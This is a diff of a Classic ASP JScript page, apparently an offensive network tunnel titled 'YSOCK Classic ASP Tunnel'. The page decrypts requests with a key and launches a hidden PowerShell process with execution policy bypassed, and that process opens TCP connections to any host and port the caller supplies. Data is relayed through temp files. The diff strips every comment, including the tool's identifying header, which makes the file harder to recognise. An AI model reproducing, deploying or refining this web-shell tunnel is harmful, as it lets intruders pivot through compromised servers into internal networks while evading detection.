@@ -1,7 +1,7 @@
 <%@ Language="JScript" %>
 <%
-// YSOCK Classic ASP Tunnel - Classic Mode
-// TCP via PowerShell backend + file IPC
+
+
 var KEY = "CHANGE_ME";
 var ECTR = 0;
 var K256=[0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2];
@@ -39,7 +39,7 @@ function b64d(s){var arr=[];s=s.replace(/=+$/,"");for(var i=0;i<s.length;i+=4){v
 
 function jStr(json,key){var q='"'+key+'"';var i=json.indexOf(q);if(i<0)return null;i+=q.length;while(i<json.length&&json.charAt(i)!==':')i++;if(i>=json.length)return null;i++;while(i<json.length&&json.charAt(i)===' ')i++;if(i>=json.length)return null;if(json.charAt(i)==='"'){var sb="";i++;while(i<json.length&&json.charAt(i)!=='"'){if(json.charAt(i)==='\\'&&i+1<json.length){i++;sb+=json.charAt(i);}else{sb+=json.charAt(i);}i++;}return sb;}var s=i;while(i<json.length&&",} \t\r\n".indexOf(json.charAt(i))<0)i++;return json.substring(s,i);}
 
-// File IPC helpers
+
 function getSessionDir(sid){return tempDir+"\\ysock_"+sid;}
 function getWFile(sid){return getSessionDir(sid)+"\\w.txt";}
 function getRFile(sid){return getSessionDir(sid)+"\\r.txt";}
@@ -72,10 +72,10 @@ function startBgPS(sid,host,port){
     var wFile=getWFile(sid);
     var rFile=getRFile(sid);
     var cFile=getCFile(sid);
-    // init empty files
+
     var f=fso.CreateTextFile(wFile,true);f.Close();
     f=fso.CreateTextFile(rFile,true);f.Close();
-    // PowerShell background script
+
     var ps='$ErrorActionPreference="SilentlyContinue"\r\n';
     ps+='$h="'+host+'"\r\n';
     ps+='$p='+port+'\r\n';
@@ -112,16 +112,16 @@ function startBgPS(sid,host,port){
     ps+='}\r\n';
     ps+='if($sock.Connected){$sock.Close()}\r\n';
     ps+='New-Item $c -ItemType File -Force|Out-Null\r\n';
-    // write ps1
+
     var psFile=getPsFile(sid);
     f=fso.CreateTextFile(psFile,true);
     f.Write(ps);
     f.Close();
-    // run hidden
+
     shell.Run('powershell -WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "'+psFile+'"',0,false);
 }
 
-// Read request body
+
 var bodyStr="";
 if(Request.TotalBytes>0){
     var bs=Request.BinaryRead(Request.TotalBytes);
@@ -150,17 +150,17 @@ if(action==="cc"){
     var synInfo=parseSyn(raw);
     if(synData===null||synInfo===null){Response.Write("{\"d\":\"\"}");Response.End();}
     var sid=synInfo[0];var seq=synInfo[1];
-    // parse target
+
     var hlen=synData[0];
     var host="";
     for(var i=0;i<hlen;i++)host+=String.fromCharCode(synData[1+i]);
     var port=(synData[1+hlen]<<8)|synData[2+hlen];
     try{
         startBgPS(sid,host,port);
-        // wait briefly for connection
+
         var wait=0;
         while(!fso.FileExists(getCFile(sid))&&wait<20){var x=new Date().getTime();while(new Date().getTime()-x<100);}
-        // check if failed (c file exists means PS exited)
+
         if(fso.FileExists(getCFile(sid))&&(!fso.FileExists(getRFile(sid)))){
             Response.Write("{\"d\":\"\"}");
             Response.End();
@@ -180,7 +180,7 @@ if(action==="cp"){
     var rd=jStr(bodyStr,"d");
     var sid=0;
     if(idStr!==null&&idStr.length>0)sid=parseInt(idStr);
-    // write data if present
+
     if(rd!==null&&rd.length>0&&sid>0){
         var raw=dec(b64d(rd),KEY);
         if(raw!==null){
